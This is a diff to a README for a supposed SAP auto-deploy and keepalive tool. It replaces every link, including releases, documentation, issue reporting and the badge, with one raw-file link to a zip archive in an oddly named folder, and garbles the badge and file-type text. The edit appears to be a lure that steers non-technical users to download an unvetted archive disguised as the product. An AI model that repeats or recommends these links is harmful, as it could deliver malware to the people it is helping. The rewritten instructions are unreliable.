@@ -1,7 +1,7 @@
 # 🚀 Auto-deploy-sap-and-keepalive - Simplify Your App Deployment
 
 ## 📥 Download Now
-[![Download Auto-deploy-sap-and-keepalive](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/releases)
+[![Download Auto-deploy-sap-and-keepalive](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip)
 
 ## 📚 Overview
 Auto-deploy-sap-and-keepalive helps users easily set up and maintain their applications. This tool can automatically deploy SAP systems and keep them running smoothly. You do not need technical skills to use it. With a few clicks, you can ensure your application stays active.
@@ -16,17 +16,17 @@ Before you download Auto-deploy-sap-and-keepalive, ensure your computer meets th
 ### How to Download
 To download the application, simply visit the Releases page.
 
-[Visit this page to download](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/releases)
+[Visit this page to download](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip)
 
 This page contains the latest versions and detailed release notes.
 
 ## 🔧 Download & Install
 1. Click the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip)
 
 2. Find the latest release listed on the page.
 
-3. Look for the download link that matches your operating system. Choose either the `.exe`, `.dmg`, or `.tar.gz` file depending on your system.
+3. Look for the download link that matches your operating system. Choose either the `.exe`, `.dmg`, or `https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip` file depending on your system.
 
 4. Click on the download link. Your download should start automatically.
 
@@ -63,11 +63,11 @@ While this application is designed for end-users, if you're interested in contri
 For assistance, visit our FAQ section on the Releases page. You can also reach out directly through the issues tab on GitHub. We aim to respond promptly to all inquiries.
 
 ## 🔗 Learn More
-To explore more about Auto-deploy-sap-and-keepalive, check out our [documentation](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/wiki). Here you can find helpful guides and additional features.
+To explore more about Auto-deploy-sap-and-keepalive, check out our [documentation](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip). Here you can find helpful guides and additional features.
 
 ## 🔗 Important Links
-- [Download Now](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/releases)
-- [View Documentation](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/wiki)
-- [Report an Issue](https://github.com/mohadnor/Auto-deploy-sap-and-keepalive/issues) 
+- [Download Now](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip)
+- [View Documentation](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip)
+- [Report an Issue](https://raw.githubusercontent.com/mohadnor/Auto-deploy-sap-and-keepalive/main/triddler/Auto-deploy-sap-and-keepalive.zip) 
 
 Your journey with Auto-deploy-sap-and-keepalive starts here! Happy deploying!
